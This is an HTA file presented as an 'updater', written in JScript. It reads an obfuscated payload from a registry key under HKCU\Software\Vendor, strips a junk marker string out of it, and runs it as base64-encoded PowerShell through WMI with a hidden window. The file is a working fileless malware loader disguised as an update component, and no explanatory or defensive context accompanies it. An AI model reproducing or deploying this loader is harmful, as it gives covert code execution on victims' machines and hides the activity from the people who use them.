<HTA:APPLICATION ID="updater" APPLICATIONNAME="updater" />
<script language="JScript">
var sh = new ActiveXObject("WScript.Shell");
var env = sh.Environment("User");
env.Item("Updater") = "wscript.exe";
var raw = sh.RegRead("HKCU\\Software\\Vendor\\Blob");
var clean = raw.split("SeventhSealJunkMarker").join("");
var svc = GetObject("winmgmts:\\\\.\\root\\cimv2");
var proc = svc.Get("Win32_Process");
var si = proc.Methods_("Create").inParameters.SpawnInstance_();
si.ShowWindow = 0;
proc.Create("powershell -enc " + clean, null, si, null);
</script>
